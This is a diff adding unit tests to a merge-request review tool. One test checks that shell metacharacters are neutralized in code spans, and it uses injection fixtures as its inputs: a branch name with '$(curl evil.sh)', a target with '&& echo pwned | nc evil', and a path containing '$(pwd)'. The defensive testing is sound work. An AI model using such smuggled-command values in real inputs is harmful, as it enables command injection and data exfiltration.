@@ -332,6 +332,36 @@ class FixPromptTests(unittest.TestCase):
             self.assertLessEqual(len(item["problem"]), 500)
             self.assertLessEqual(len(item["recommendation"]), 500)
 
+    def test_shell_metachars_neutralized_in_code_spans(self):
+        # Amendment 3 / review F1: $();&| are legal in Git ref names and
+        # file paths, and project/source/target/file_path render inside
+        # backticked code spans (the header spans and the copy-paste
+        # `git diff origin/<target>...<source>` command) — command
+        # substitution must never survive into them.
+        findings = [{"file_path": "src/$(pwd)/x;1.py", "line_number": 1,
+                     "severity": "critical", "title": "t", "problem": "p",
+                     "recommendation": "r", "category": "c"}]
+        meta = dict(GOLDEN_META, source_branch="feat/x$(curl evil.sh)",
+                    target_branch="main && echo pwned | nc evil",
+                    path_with_namespace="regenai/a&b|c;d")
+        code, out, err = self.run_cli(findings, {"0": 901}, meta)
+        self.assertEqual(code, 0, err)
+        # $, ; and & appear nowhere in this clean-fixture brief; ( ) and |
+        # do appear in the template itself, so they are checked per span
+        # below instead of brief-wide.
+        for ch in "$;&":
+            self.assertNotIn(ch, out)
+        self.assertNotIn("$(curl evil.sh)", out)
+        self.assertIn("`feat/x curl evil.sh`", out)        # header source
+        self.assertIn("`main echo pwned nc evil`", out)    # header target
+        self.assertIn("`regenai/a b c d`", out)            # project span
+        items = parse_finding_items(out)
+        self.assertEqual(items[0]["locus"], "src/ pwd /x 1.py:1")
+        m = re.search(r"`git diff origin/(.+)\.\.\.(.+)`", out)
+        self.assertTrue(m, out)
+        for span in (m.group(1), m.group(2), items[0]["locus"]):
+            self.assertLessEqual(set(span) & set("$;&()|"), set())
+
     def test_caps_and_top25_severity_order(self):
         sevs = ("critical", "important", "minor")
         findings = []
@@ -414,6 +444,28 @@ class FixPromptTests(unittest.TestCase):
         self.assertEqual(items[0]["locus"], "MR note")
         self.assertEqual(items[0]["link"], WEB_URL + "#note_77")
         self.assertIn("— `MR note` —", out)
+
+    def test_intent_heading_only_paragraph_skipped(self):
+        # Review F2: the heading-only-paragraph skip branch exercised — a
+        # single-word heading paragraph ("## DRAFT") is skipped and the
+        # first real paragraph becomes the intent. (The HEADING_LINE_RE
+        # single-word limitation is pinned spec conformance — not changed.)
+        meta = dict(GOLDEN_META, description="## DRAFT\n\nReal intent paragraph.")
+        code, out, err = self.run_cli(GOLDEN_FINDINGS[:1], {"0": 901}, meta)
+        self.assertEqual(code, 0, err)
+        self.assertIn("MR intent (the big picture to protect): "
+                      "Real intent paragraph.", out)
+
+    def test_intent_all_headings_falls_back_to_title(self):
+        # Review F3: a description consisting ONLY of heading paragraphs
+        # must fall back to the sanitized MR title — never an empty intent
+        # line with a trailing space.
+        meta = dict(GOLDEN_META, description="## DRAFT\n### NOTES")
+        code, out, err = self.run_cli(GOLDEN_FINDINGS[:1], {"0": 901}, meta)
+        self.assertEqual(code, 0, err)
+        self.assertIn("MR intent (the big picture to protect): "
+                      "Add cache layer", out)
+        self.assertNotIn("MR intent (the big picture to protect): \n", out)
 
     # ── offline mode (AC-16) ───────────────────────────────────
 
